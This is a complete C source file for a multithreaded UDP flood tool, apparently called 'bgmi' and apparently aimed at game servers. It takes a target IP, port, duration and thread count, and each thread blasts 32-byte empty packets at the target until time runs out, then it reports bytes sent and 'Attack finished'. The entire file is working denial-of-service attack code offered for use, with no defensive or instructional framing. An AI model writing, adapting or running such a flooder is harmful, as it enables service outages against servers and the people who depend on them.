#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define DEFAULT_PACKETS 1000
#define PACKET_SIZE 32 // Fixed empty packet size (in bytes)

void usage() {
    printf("Usage: ./bgmi <ip> <port> <time> <threads>\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
    int packets;
    long long bytes_sent;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    char *empty_payload = calloc(PACKET_SIZE, sizeof(char)); // zero-filled buffer

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        free(empty_payload);
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    long long bytes = 0;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < data->packets; i++) {
            ssize_t sent = sendto(sock, empty_payload, PACKET_SIZE, 0,
                                  (const struct sockaddr *)&server_addr, sizeof(server_addr));
            if (sent < 0) {
                perror("Send failed");
                close(sock);
                free(empty_payload);
                pthread_exit(NULL);
            }
            bytes += sent;
        }
    }

    data->bytes_sent = bytes;

    close(sock);
    free(empty_payload);
    pthread_exit(NULL);
}

void format_bytes(long long bytes) {
    const char *units[] = {"B", "KB", "MB", "GB"};
    int i = 0;
    double size = (double)bytes;
    while (size >= 1024 && i < 3) {
        size /= 1024;
        i++;
    }
    printf("Total Data Sent: %.2f %s\n", size, units[i]);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    int packets = DEFAULT_PACKETS;

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data **thread_data_array = malloc(threads * sizeof(struct thread_data *));
    long long total_bytes_sent = 0;

    printf("Flood started on %s:%d for %d seconds with %d packets/thread, %d threads, packet size %d bytes\n",
           ip, port, time, packets, threads, PACKET_SIZE);

    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        data->ip = ip;
        data->port = port;
        data->time = time;
        data->packets = packets;
        data->bytes_sent = 0;
        thread_data_array[i] = data;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            perror("Thread creation failed");
            free(data);
            free(thread_ids);
            free(thread_data_array);
            exit(1);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
        total_bytes_sent += thread_data_array[i]->bytes_sent;
        free(thread_data_array[i]);
    }

    free(thread_ids);
    free(thread_data_array);

    format_bytes(total_bytes_sent);
    printf("Attack finished\n");

    return 0;
}
